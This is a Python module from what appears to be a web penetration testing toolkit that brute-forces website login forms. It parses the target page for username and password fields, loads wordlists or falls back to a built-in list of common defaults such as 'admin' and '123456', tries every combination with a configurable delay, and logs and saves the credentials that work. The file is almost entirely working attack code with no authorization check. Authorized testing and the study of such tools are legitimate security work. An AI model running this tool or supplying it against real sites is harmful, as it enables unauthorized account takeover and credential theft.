"""
Login Bruteforce Tool
Developer: Sanad.CodeX
VOIDEX - Web Penetration Testing Toolkit
"""

import sys
import os
sys.path.append(os.path.dirname(os.path.dirname(os.path.dirname(__file__))))

from core import HTTPClient, Logger, Validator
from bs4 import BeautifulSoup
from typing import List, Dict, Tuple
from tqdm import tqdm
import time
import itertools


class LoginBruteforce:
    """Login form bruteforce tool."""
    
    def __init__(self, logger: Logger, http_client: HTTPClient):
        self.logger = logger
        self.http_client = http_client
        self.success_credentials = []
    
    def _load_wordlist(self, wordlist_path: str, list_type: str) -> List[str]:
        """Load username or password wordlist."""
        if wordlist_path and os.path.exists(wordlist_path):
            with open(wordlist_path, 'r', encoding='utf-8', errors='ignore') as f:
                return [line.strip() for line in f if line.strip()]
        
        # Default wordlist path
        default_path = os.path.join(
            os.path.dirname(os.path.dirname(os.path.dirname(__file__))),
            'wordlists',
            f'{list_type}.txt'
        )
        
        if os.path.exists(default_path):
            with open(default_path, 'r', encoding='utf-8', errors='ignore') as f:
                return [line.strip() for line in f if line.strip()]
        
        # Fallback minimal wordlist
        if list_type == 'usernames':
            return ['admin', 'root', 'user', 'administrator', 'test', 'guest']
        else:  # passwords
            return ['password', '123456', 'admin', 'root', '12345678', 'password123']
    
    def _extract_form(self, html: str, login_url: str) -> Dict:
        """Extract login form details from HTML."""
        soup = BeautifulSoup(html, 'html.parser')
        
        # Try to find login form
        forms = soup.find_all('form')
        
        for form in forms:
            form_inputs = form.find_all('input')
            
            # Look for typical login form fields
            has_username = False
            has_password = False
            username_field = None
            password_field = None
            
            for inp in form_inputs:
                input_type = inp.get('type', '').lower()
                input_name = inp.get('name', '')
                
                if input_type in ['text', 'email'] or 'user' in input_name.lower() or 'email' in input_name.lower():
                    has_username = True
                    username_field = input_name
                
                if input_type == 'password' or 'pass' in input_name.lower():
                    has_password = True
                    password_field = input_name
            
            if has_username and has_password:
                action = form.get('action', '')
                method = form.get('method', 'post').lower()
                
                # Make action URL absolute
                if action:
                    if not action.startswith('http'):
                        from urllib.parse import urljoin
                        action = urljoin(login_url, action)
                else:
                    action = login_url
                
                # Extract all form fields
                all_fields = {}
                for inp in form_inputs:
                    name = inp.get('name')
                    value = inp.get('value', '')
                    if name:
                        all_fields[name] = value
                
                return {
                    'action': action,
                    'method': method,
                    'username_field': username_field,
                    'password_field': password_field,
                    'all_fields': all_fields
                }
        
        return None
    
    def _attempt_login(self, form_data: Dict, username: str, 
                      password: str) -> Tuple[bool, int, str]:
        """Attempt a single login."""
        # Prepare form data
        data = form_data['all_fields'].copy()
        data[form_data['username_field']] = username
        data[form_data['password_field']] = password
        
        # Send request
        if form_data['method'] == 'post':
            response = self.http_client.post(form_data['action'], data=data)
        else:
            response = self.http_client.get(form_data['action'], params=data)
        
        if not response:
            return False, 0, ""
        
        # Check for success indicators
        content = response.text.lower()
        url = response.url.lower()
        
        # Failure indicators
        fail_indicators = [
            'incorrect', 'invalid', 'failed', 'error', 'wrong',
            'authentication failed', 'login failed', 'bad credentials',
            'incorrect username or password'
        ]
        
        # Success indicators
        success_indicators = [
            'dashboard', 'welcome', 'logout', 'profile', 'account',
            'successfully logged in', 'signed in successfully'
        ]
        
        has_fail = any(indicator in content for indicator in fail_indicators)
        has_success = any(indicator in content for indicator in success_indicators)
        
        # Check for redirect (common success pattern)
        is_redirect = response.status_code in [301, 302, 303, 307]
        
        # Determine success
        if has_success or (is_redirect and not has_fail):
            return True, response.status_code, response.url
        
        return False, response.status_code, response.url
    
    def bruteforce(self, url: str, username_list: str = None,
                  password_list: str = None, single_user: str = None,
                  single_pass: str = None, delay: float = 0.5) -> dict:
        """Bruteforce login form."""
        self.logger.section("LOGIN BRUTEFORCE")
        self.logger.info(f"Target: {url}")
        
        if not Validator.is_valid_url(url):
            self.logger.error("Invalid URL format")
            return {'success': False, 'credentials': []}
        
        # Fetch login page
        response = self.http_client.get(url)
        if not response:
            self.logger.error("Failed to fetch login page")
            return {'success': False, 'credentials': []}
        
        # Extract form
        form_data = self._extract_form(response.text, url)
        if not form_data:
            self.logger.error("Could not find login form on the page")
            return {'success': False, 'credentials': []}
        
        self.logger.success(f"Found login form at: {form_data['action']}")
        self.logger.info(f"Username field: {form_data['username_field']}")
        self.logger.info(f"Password field: {form_data['password_field']}")
        
        # Load wordlists
        if single_user:
            usernames = [single_user]
        else:
            usernames = self._load_wordlist(username_list, 'usernames')
        
        if single_pass:
            passwords = [single_pass]
        else:
            passwords = self._load_wordlist(password_list, 'passwords')
        
        self.logger.info(f"Loaded {len(usernames)} usernames and {len(passwords)} passwords")
        
        # Generate combinations
        combinations = list(itertools.product(usernames, passwords))
        total = len(combinations)
        
        self.logger.info(f"Testing {total} combinations...")
        self.logger.warning("This may take a while. Press Ctrl+C to stop.")
        
        found_credentials = []
        
        try:
            with tqdm(total=total, desc="Bruteforcing", 
                     bar_format='{l_bar}{bar}| {n_fmt}/{total_fmt}') as pbar:
                for username, password in combinations:
                    success, status, redirect_url = self._attempt_login(
                        form_data, username, password
                    )
                    
                    if success:
                        credential = {
                            'username': username,
                            'password': password,
                            'status': status,
                            'redirect': redirect_url
                        }
                        found_credentials.append(credential)
                        self.logger.vuln(
                            f"VALID CREDENTIALS: {username}:{password}"
                        )
                    
                    pbar.update(1)
                    time.sleep(delay)
        
        except KeyboardInterrupt:
            self.logger.warning("\nBruteforce stopped by user")
        
        result = {
            'success': len(found_credentials) > 0,
            'credentials': found_credentials,
            'url': url,
            'tested': total
        }
        
        if found_credentials:
            self.logger.success(f"Found {len(found_credentials)} valid credentials!")
        else:
            self.logger.info("No valid credentials found")
        
        return result


def run(args, config):
    """Run login bruteforce."""
    from core import Config
    
    cfg = Config(config if config else 'config.yaml')
    logger = Logger("Login Bruteforce", args.output if hasattr(args, 'output') else None)
    http_client = HTTPClient(
        timeout=cfg.get('timeout'),
        verify_ssl=cfg.get('verify_ssl'),
        user_agents=cfg.get('user_agents')
    )
    
    bruteforcer = LoginBruteforce(logger, http_client)
    
    username_list = getattr(args, 'usernames', None)
    password_list = getattr(args, 'passwords', None)
    single_user = getattr(args, 'username', None)
    single_pass = getattr(args, 'password', None)
    delay = getattr(args, 'delay', cfg.get('delay', 0.5))
    
    result = bruteforcer.bruteforce(
        args.url, username_list, password_list, 
        single_user, single_pass, delay
    )
    
    # Save results if output file specified
    if hasattr(args, 'output') and args.output and result['success']:
        import json
        with open(args.output, 'w') as f:
            json.dump(result, f, indent=4)
        logger.success(f"Results saved to {args.output}")
    
    http_client.close()
    return result
